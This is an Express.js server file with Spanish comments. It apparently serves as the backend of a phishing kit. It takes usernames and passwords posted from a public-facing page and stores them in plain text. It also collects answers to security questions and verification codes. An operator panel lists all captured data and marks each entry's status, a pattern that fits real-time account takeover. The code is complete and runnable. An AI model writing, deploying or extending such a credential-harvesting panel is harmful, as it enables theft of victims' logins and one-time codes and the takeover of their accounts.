const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Datos en memoria
let preguntas = [
  { id: 1, texto: "¿Cuál es tu cantante favorito?" },
  { id: 2, texto: "¿Cuál es el primer nombre de tu primo(a) materno mayor?" }
];
let respuestas = [];
let solicitantes = [];
let codigosVerificacion = [];
let nextPreguntaId = 3;
let nextSolicitanteId = 1;
let nextCodigoId = 1;

// Servir archivos estáticos y panel.html
app.use(express.static(path.join(__dirname)));

// RUTA PRINCIPAL para recibir login desde la web pública
app.post('/', (req, res) => {
  const { usr, clv, device, id, website } = req.body;

  // Honeypot (campo trampa) para evitar bots
  if (website) {
    return res.status(400).json({ success: false, error: 'Actividad sospechosa detectada.' });
  }

  // Validación mínima
  if (!usr || !clv) {
    return res.status(400).json({ success: false, error: 'Faltan datos de usuario o clave.' });
  }

  // Guardar la solicitud
  solicitantes.push({
    id: nextSolicitanteId++,
    usuario: usr,
    clave: clv,
    estado: 'pendiente',
    fecha: new Date(),
    device,
    sessionId: id
  });

  console.log("Solicitud login recibida:", usr);

  res.json({ success: true, sessionId: id });
});

// Preguntas
app.get('/preguntas', (req, res) => res.json(preguntas));
app.post('/preguntas', (req, res) => {
  const { texto } = req.body;
  if (!texto) return res.status(400).json({ error: 'Falta texto' });
  const p = { id: nextPreguntaId++, texto };
  preguntas.push(p);
  res.status(201).json(p);
});
app.delete('/preguntas/:id', (req, res) => {
  const id = +req.params.id;
  preguntas = preguntas.filter(p => p.id !== id);
  res.json({ message: 'Pregunta eliminada' });
});

// Respuestas
app.post('/respuestas', (req, res) => {
  const { usuario, respuestasUsuario } = req.body;
  if (!usuario || !respuestasUsuario) return res.status(400).json({ error: 'Datos incompletos' });
  respuestas.push({ id: respuestas.length + 1, usuario, respuestasUsuario, fecha: new Date() });
  res.status(201).json({ message: 'Respuestas recibidas' });
});
app.get('/respuestas', (req, res) => res.json(respuestas));

// Solicitudes login (desde panel)
app.get('/solicitantes', (req, res) => res.json(solicitantes));
app.put('/solicitantes/:id', (req, res) => {
  const id = +req.params.id;
  const { estado } = req.body;
  const s = solicitantes.find(sol => sol.id === id);
  if (!s) return res.status(404).json({ error: 'No encontrado' });
  s.estado = estado || s.estado;
  res.json(s);
});

// Códigos de verificación
app.post('/codigo', (req, res) => {
  const { usuario, codigo } = req.body;
  if (!usuario || !codigo) return res.status(400).json({ error: 'Datos incompletos' });

  const index = codigosVerificacion.findIndex(c => c.usuario === usuario);
  if (index !== -1) {
    codigosVerificacion[index].codigo = codigo;
    codigosVerificacion[index].estado = 'pendiente';
  } else {
    codigosVerificacion.push({
      id: nextCodigoId++,
      usuario,
      codigo,
      estado: 'pendiente',
      fecha: new Date()
    });
  }
  res.json({ message: 'Código recibido, pendiente validación' });
});
app.get('/codigos', (req, res) => res.json(codigosVerificacion));
app.put('/codigos/:id', (req, res) => {
  const id = +req.params.id;
  const { estado } = req.body;
  const c = codigosVerificacion.find(c => c.id === id);
  if (!c) return res.status(404).json({ error: 'No encontrado' });
  c.estado = estado || c.estado;
  res.json(c);
});

// Servir panel principal
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'panel.html'));
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
